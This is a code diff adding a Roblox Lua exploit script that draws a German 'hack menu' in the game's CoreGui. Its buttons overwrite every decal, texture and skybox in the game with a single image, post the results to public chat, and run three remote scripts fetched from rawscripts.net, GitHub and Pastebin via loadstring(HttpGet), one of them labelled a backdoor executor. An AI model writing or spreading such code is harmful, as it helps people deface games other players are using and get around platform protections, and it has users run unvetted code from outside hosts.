@@ -1,0 +1,221 @@
+local targetTextureID = "90475798976269"
+local rbxAssetURL = "rbxassetid://" .. targetTextureID
+
+if not _G.DeutschesMenu then
+    _G.DeutschesMenu = true
+    
+    -- ========== FUNKTIONEN ========== --
+    
+    -- 1. Decal Spam Funktion
+    local function decalSpam()
+        pcall(function()
+            local ersetzteDecals = 0
+            
+            for _, obj in ipairs(workspace:GetDescendants()) do
+                if obj:IsA("Decal") or obj:IsA("Texture") then
+                    pcall(function()
+                        obj.Texture = rbxAssetURL
+                        ersetzteDecals += 1
+                    end)
+                end
+            end
+            
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                "✅ " .. ersetzteDecals .. " Decals ersetzt", 
+                "All"
+            )
+        end)
+    end
+
+    -- 2. Himmel Textur ersetzen
+    local function himmelErsetzen()
+        pcall(function()
+            local lighting = game:GetService("Lighting")
+            local himmel = lighting:FindFirstChildOfClass("Sky")
+            
+            if not himmel then
+                himmel = Instance.new("Sky")
+                himmel.Parent = lighting
+            end
+            
+            himmel.SkyboxBk = rbxAssetURL
+            himmel.SkyboxDn = rbxAssetURL
+            himmel.SkyboxFt = rbxAssetURL
+            himmel.SkyboxLf = rbxAssetURL
+            himmel.SkyboxRt = rbxAssetURL
+            himmel.SkyboxUp = rbxAssetURL
+            
+            himmel.StarCount = 0
+            himmel.SunAngularSize = 0
+            himmel.MoonAngularSize = 0
+            
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                "✅ Himmeltextur geändert", 
+                "All"
+            )
+        end)
+    end
+
+    -- 3. Caducus FE Executor
+    local function caducusAusfuehren()
+        pcall(function()
+            loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Caducus-The-fallen-god-REQUIRES-REANIMATION-TO-WORK-47600", true))()
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                "✅ Caducus FE ausgeführt", 
+                "All"
+            )
+        end)
+    end
+
+    -- 4. Backdoor Executor
+    local function backdoorAusfuehren()
+        pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Botsupport-cpu/Krnl-menu/refs/heads/main/Krnl%20menu", true))()
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                "✅ Backdoor aktiviert", 
+                "All"
+            )
+        end)
+    end
+
+    -- 5. Knife FE Executor
+    local function knifeFEAusfuehren()
+        pcall(function()
+            -- Knife FE Script von Pastebin
+            loadstring(game:HttpGet("https://pastebin.com/raw/apzME85h", true))()
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                "✅ Knife FE ausgeführt", 
+                "All"
+            )
+        end)
+    end
+
+    -- ========== ERWEITERTES DEUTSCHES MENÜ ========== --
+    
+    local function erstelleMenu()
+        if game:GetService("CoreGui"):FindFirstChild("DeutschesHackMenu") then
+            game:GetService("CoreGui").DeutschesHackMenu:Destroy()
+        end
+
+        local ScreenGui = Instance.new("ScreenGui")
+        ScreenGui.Name = "DeutschesHackMenu"
+        ScreenGui.Parent = game:GetService("CoreGui")
+        ScreenGui.ResetOnSpawn = false
+
+        local HauptFrame = Instance.new("Frame")
+        HauptFrame.Name = "HauptFrame"
+        HauptFrame.Size = UDim2.new(0.4, 0, 0.6, 0)
+        HauptFrame.Position = UDim2.new(0.02, 0, 0.2, 0)
+        HauptFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+        HauptFrame.BorderColor3 = Color3.fromRGB(255, 200, 0)
+        HauptFrame.BorderSizePixel = 2
+        HauptFrame.Active = true
+        HauptFrame.Parent = ScreenGui
+
+        local Titel = Instance.new("TextLabel")
+        Titel.Size = UDim2.new(1, 0, 0.08, 0)
+        Titel.Text = "🔧 DEUTSCHES HACK MENÜ"
+        Titel.TextColor3 = Color3.fromRGB(255, 200, 0)
+        Titel.BackgroundTransparency = 1
+        Titel.Font = Enum.Font.SourceSansBold
+        Titel.TextSize = 16
+        Titel.Parent = HauptFrame
+
+        -- Menüknöpfe mit neuer Knife FE Funktion
+        local knoepfe = {
+            {Text = "🎨 DECAL SPAM", Pos = 0.09, Color = Color3.fromRGB(0, 150, 255), Func = decalSpam},
+            {Text = "🌌 HIMMEL ERSETZEN", Pos = 0.18, Color = Color3.fromRGB(100, 0, 200), Func = himmelErsetzen},
+            {Text = "⚡ CADUCUS FE", Pos = 0.27, Color = Color3.fromRGB(139, 0, 139), Func = caducusAusfuehren},
+            {Text = "🔪 KNIFE FE", Pos = 0.36, Color = Color3.fromRGB(200, 0, 0), Func = knifeFEAusfuehren},
+            {Text = "🔓 BACKDOOR EXECUTOR", Pos = 0.45, Color = Color3.fromRGB(0, 100, 0), Func = backdoorAusfuehren}
+        }
+
+        for _, knopf in ipairs(knoepfe) do
+            local button = Instance.new("TextButton")
+            button.Size = UDim2.new(0.9, 0, 0.14, 0)
+            button.Position = UDim2.new(0.05, 0, knopf.Pos, 0)
+            button.Text = knopf.Text
+            button.BackgroundColor3 = knopf.Color
+            button.TextColor3 = Color3.fromRGB(255, 255, 255)
+            button.Font = Enum.Font.SourceSansBold
+            button.TextSize = 12
+            button.BorderSizePixel = 1
+            button.BorderColor3 = Color3.fromRGB(50, 50, 50)
+            button.Parent = HauptFrame
+            button.MouseButton1Click:Connect(knopf.Func)
+        end
+
+        -- Info Text mit allen Funktionen
+        local InfoText = Instance.new("TextLabel")
+        InfoText.Size = UDim2.new(0.9, 0, 0.25, 0)
+        InfoText.Position = UDim2.new(0.05, 0, 0.62, 0)
+        InfoText.Text = "📋 FUNKTIONEN:\n• Decal Spam System\n• Himmel Textur Wechsel\n• Caducus FE Bypass\n• Knife FE Script\n• Backdoor Executor\n\nTexture ID: " .. targetTextureID
+        InfoText.TextColor3 = Color3.fromRGB(200, 200, 100)
+        InfoText.BackgroundTransparency = 1
+        InfoText.Font = Enum.Font.SourceSans
+        InfoText.TextSize = 11
+        InfoText.TextXAlignment = Enum.TextXAlignment.Left
+        InfoText.Parent = HauptFrame
+
+        -- Schließen Knopf
+        local SchliessenKnopf = Instance.new("TextButton")
+        SchliessenKnopf.Size = UDim2.new(0.12, 0, 0.08, 0)
+        SchliessenKnopf.Position = UDim2.new(0.84, 0, 0.005, 0)
+        SchliessenKnopf.Text = "X"
+        SchliessenKnopf.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+        SchliessenKnopf.TextColor3 = Color3.fromRGB(255, 255, 255)
+        SchliessenKnopf.Font = Enum.Font.SourceSansBold
+        SchliessenKnopf.TextSize = 12
+        SchliessenKnopf.Parent = HauptFrame
+        SchliessenKnopf.MouseButton1Click:Connect(function()
+            ScreenGui:Destroy()
+        end)
+
+        -- ========== BEWEGUNGSYSTEM ========== --
+        
+        local UserInputService = game:GetService("UserInputService")
+        local wirdGezogen = false
+        local zugStart = Vector3.new()
+        local startPosition = UDim2.new()
+
+        local function bewegen(input)
+            if wirdGezogen and input.UserInputType == Enum.UserInputType.Touch then
+                local delta = Vector3.new(input.Position.X, input.Position.Y, 0) - zugStart
+                local neueX = math.clamp(startPosition.X.Offset + delta.X, 0, 800)
+                local neueY = math.clamp(startPosition.Y.Offset + delta.Y, 0, 500)
+                HauptFrame.Position = UDim2.new(0, neueX, 0, neueY)
+            end
+        end
+
+        HauptFrame.InputBegan:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.Touch then
+                wirdGezogen = true
+                zugStart = Vector3.new(input.Position.X, input.Position.Y, 0)
+                startPosition = HauptFrame.Position
+                HauptFrame.BorderColor3 = Color3.fromRGB(0, 255, 0)
+            end
+        end)
+
+        HauptFrame.InputEnded:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.Touch then
+                wirdGezogen = false
+                HauptFrame.BorderColor3 = Color3.fromRGB(255, 200, 0)
+            end
+        end)
+
+        UserInputService.InputChanged:Connect(function(input)
+            bewegen(input)
+        end)
+    end
+
+    -- Menü erstellen
+    erstelleMenu()
+
+    -- Auto-Restore nach Respawn
+    game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()
+        task.wait(2)
+        if not game:GetService("CoreGui"):FindFirstChild("DeutschesHackMenu") then
+            erstelleMenu()
+        end
+    end)
+end
